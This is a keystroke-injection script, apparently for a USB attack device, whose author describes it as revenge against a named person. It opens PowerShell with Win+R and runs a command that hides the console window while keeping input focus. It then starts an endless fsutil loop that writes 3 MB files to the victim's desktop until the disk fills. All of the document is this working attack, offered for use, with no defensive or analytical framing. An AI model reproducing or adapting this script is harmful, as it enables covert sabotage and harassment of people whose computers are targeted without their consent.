/*////////////////////////////////////////////////////
Yes, this set is part of my revenge agaist Jerem Vol.6
Burst files
////////////////////////////////////////////////////*/

/*////////////////////////////////////////////////////
SET GLOBALCONFIG
////////////////////////////////////////////////////*/
layout("fr");
hide=true;
typingSpeed(50,100);

/*////////////////////////////////////////////////////
Script
////////////////////////////////////////////////////*/
// Open an interactive admin PowerShell console
press("GUI r");
delay(500);
type("powershell");
delay(400);
press("ENTER");
delay(300);
typingSpeed(10,10);
// Hide an already opened PowerShell console, but keep input focus, to gon on typing
type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)');
delay(300);
press("ENTER");
delay(500);
type('$name = 0 ; While($true) {$name++ ; fsutil file createnew "Desktop\\do_Not_Fuck_With_Me.$name" 3000000}');
typingSpeed(50,100);
delay(300);
press("ENTER");
